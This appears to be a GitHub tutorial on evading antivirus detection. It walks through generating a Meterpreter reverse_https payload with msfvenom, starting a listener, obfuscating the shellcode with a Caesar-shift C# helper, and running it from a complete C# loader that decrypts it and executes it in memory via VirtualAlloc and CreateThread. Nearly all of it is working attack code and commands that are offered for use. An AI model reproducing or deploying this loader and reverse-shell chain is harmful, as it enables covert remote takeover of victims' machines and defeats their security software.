# Full Process: Encrypting & Running Shellcode in C#

- **Generate & encrypt shellcode (Helper app)**
- **Format and print encrypted payload**
- **Use the encrypted payload in your loader**
- **Decrypt at runtime & execute**

## 1. **Overview**

- **Problem:** Raw shellcode is easily flagged by AV (signatures).
- **Solution:** Encrypt shellcode → store encrypted payload → decrypt at runtime → execute in memory.
- **Method used here:** Simple Caesar Cipher with key = 2.
    - Encryption: `(byte + 2) & 0xFF`
    - Decryption: `(byte - 2) & 0xFF`

- Create Shellcode
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.2.142 LPORT=4444 -f csharp 
    ```
- Create listener
  ```bash
   msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 10.10.2.142; set LPORT 4444; exploit"
  ```
---

## 2. **Step 1 – Encryption Helper App**

This **standalone app** takes raw shellcode, applies Caesar Cipher encryption, and prints it in **msfvenom format** (`0x##,`).

```csharp
using System;
using System.IO;
using System.Text;

namespace Encrypter
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf;

            if (args.Length == 0)
            {
                Console.WriteLine("Usage:");
                Console.WriteLine("  Encrypter.exe <shellcode.txt | raw bytes>");
                Console.WriteLine("Example (file): Encrypter.exe shellcode.txt");
                Console.WriteLine("Example (inline): Encrypter.exe 0xfc,0x48,0x83,0xe4,0xf0");
                return;
            }

            // Option 1: Read from file if argument is a file
            if (File.Exists(args[0]))
            {
                string fileContent = File.ReadAllText(args[0]).Trim();
                buf = ParseShellcode(fileContent);
            }
            else
            {
                // Option 2: Treat argument as inline shellcode string
                buf = ParseShellcode(args[0]);
            }

            // Encrypt shellcode
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }

            // Print in msfvenom-style format (no trailing comma at the end)
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            for (int i = 0; i < encoded.Length; i++)
            {
                hex.AppendFormat("0x{0:x2}", encoded[i]);
                if (i != encoded.Length - 1)
                {
                    hex.Append(", ");
                }
            }

            Console.WriteLine("Encrypted Payload:\n" + hex.ToString());
        }

        // Helper: Parse shellcode string (e.g., "0xfc,0x48,0x83")
        static byte[] ParseShellcode(string input)
        {
            string[] parts = input.Split(new char[] { ',', ' ', '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
            byte[] result = new byte[parts.Length];

            for (int i = 0; i < parts.Length; i++)
            {
                result[i] = Convert.ToByte(parts[i].Replace("0x", ""), 16);
            }

            return result;
        }
    }
}
```
    
+  ✅ Output

  ```
  Encrypted Payload:
  0xfe, 0x4a, 0x85, 0xe6, 0xf2, ...
  ```

Now you copy this **encrypted payload** into the loader.

---

## 3. **Step 2 – Shellcode Loader with Decryption**

This is the **final executable** that holds encrypted shellcode, decrypts it at runtime, and executes it in memory.

```csharp
using System;
using System.Runtime.InteropServices;

namespace Loader
{
    class Program
    {
        // Win32 API imports
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // Encrypted shellcode (from Encrypter app)
            byte[] buf = new byte[] {
                0xfe, 0x4a, 0x85, 0xe6, 0xf2, 0xea, 0xce, 0x02,..... 
              };

            //  Decrypt shellcode at runtime (Caesar Cipher, key=2)
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            }

            //  Allocate memory for shellcode
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length,
                0x3000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE

            //  Copy decrypted shellcode into memory
            Marshal.Copy(buf, 0, addr, buf.Length);

            //  Create thread to run shellcode
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            //  Wait indefinitely for shellcode execution
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}

```

---

## 4. **Execution Flow**

```
Raw Shellcode → Encrypt with Helper → Encrypted Payload → Loader (buf)
→ Decrypt at Runtime → Allocate Memory → Copy to Memory → Execute with CreateThread
```
<img width="1888" height="399" alt="image" src="https://github.com/user-attachments/assets/02a79f97-ec01-4482-9259-0d61b91b8b52" />

